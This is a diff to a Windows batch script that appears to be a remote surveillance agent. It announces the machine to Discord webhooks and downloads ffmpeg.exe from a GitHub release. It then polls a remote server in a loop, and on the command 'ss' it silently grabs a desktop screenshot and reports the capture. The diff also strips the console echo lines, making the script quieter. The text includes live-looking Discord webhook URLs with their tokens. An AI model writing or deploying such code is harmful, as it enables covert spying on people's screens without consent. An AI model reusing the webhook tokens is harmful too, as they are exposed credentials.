@@ -1,17 +1,32 @@
 @echo off
 set "apiRoot=https://screen-view-one.vercel.app"
 set /p name=<name.txt
-curl -d content="%name%, reporting for dooty" https://discord.com/api/webhooks/1337036102468505610/EeyMS7DjbOVxZvRqiY94PZ8xhBpkmdwD2ad_id3dOzMAuEV5qC0bh-BZJRi_wjSZ5JR3
+set "webhook=https://discord.com/api/webhooks/1341011448331112468/L1SNbktBvHcZmabBiTs5bh_AUXK3buMwGuZ3PynrIwpiyLAFo6y2U42KugzdaIu3PNBw"
+set "logging=https://discord.com/api/webhooks/1341011158261432381/QKCsx9XfQOZ7gSgcYCPWvBcUNnhPaU4QFb0up5IjRtjc4i39cJUWmBxIenMmBdt6te3G"
+
+curl -d content="**%name%**: Online" %webhook%
+
+if not exist "%cd%\ffmpeg.exe" (
+    curl -d content="**%name%**: ffmpeg not found, downloading..." %logging%
+    curl -L -o ffmpeg.exe "https://github.com/skollol/e/releases/download/depend/ffmpeg.exe"
+    curl -d content="**%name%**: Downloaded ffmpeg" %logging%
+) else (
+    curl -d content="**%name%**: Found ffmpeg" %logging%
+)
 
 for /f "delims=" %%i in ('curl -s "%apiRoot%/conf/ping"') do set "waitTime=%%i"
-echo Ping interval: %waitTime% seconds
 
 :loop
 for /f "delims=" %%i in ('curl -s -X POST -d "name=%name%" "%apiRoot%/u"') do set "result=%%i"
-echo Response: %result%
 
 if "%result%"=="ss" (
-    curl -d content="%name% needs to nut out ss" https://discord.com/api/webhooks/1337036102468505610/EeyMS7DjbOVxZvRqiY94PZ8xhBpkmdwD2ad_id3dOzMAuEV5qC0bh-BZJRi_wjSZ5JR3
+    if exist ss.webp del ss.webp
+    ffmpeg -f gdigrab -i desktop -draw_mouse 1 -vframes 1 ss.webp
+    if exist ss.webp (
+        curl -d content="**%name%**: Captured a screenshot" %logging%
+    ) else (
+        curl -d content="**%name%**: Error capturing screenshot" %logging%
+    )
 )
 
 timeout /t %waitTime% /nobreak >nul
